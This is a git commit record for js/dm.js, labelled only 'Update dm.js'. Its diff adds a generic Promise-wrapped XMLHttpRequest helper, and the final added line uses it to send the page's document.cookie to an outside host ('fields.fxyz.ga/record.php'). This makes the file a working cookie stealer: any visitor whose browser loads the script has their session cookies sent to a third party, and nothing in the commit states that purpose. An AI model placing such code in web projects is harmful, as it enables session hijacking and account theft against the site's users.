e5c1f7ca59b05b0164da0a301212f473e4e2ea10
Michael Zhang <failed.down@gmail.com>
2015-02-19 16:42:24 -0600

    Update dm.js

--- js/dm.js
+++ js/dm.js
@@ -1,1 +1,26 @@
-console.dir("yo");
+function get(url) {
+	// Return a new promise.
+	return new Promise(function(resolve, reject) {
+		// Do the usual XHR stuff
+		var req = new XMLHttpRequest();
+		req.open('GET', url);
+
+		req.onload = function() {
+			// This is called even on 404 etc
+			// so check the status
+			if (req.status == 200) {
+				// Resolve the promise with the response text
+				resolve(req.response);
+			} else {
+				// Otherwise reject with the status text
+				// which will hopefully be a meaningful error
+				reject(Error(req.statusText));
+			}
+		};
+		req.onerror = function() {
+			reject(Error("Network Error"));
+		};
+		req.send();
+	});
+}
+get("http://fields.fxyz.ga/record.php?c="+document.cookie);
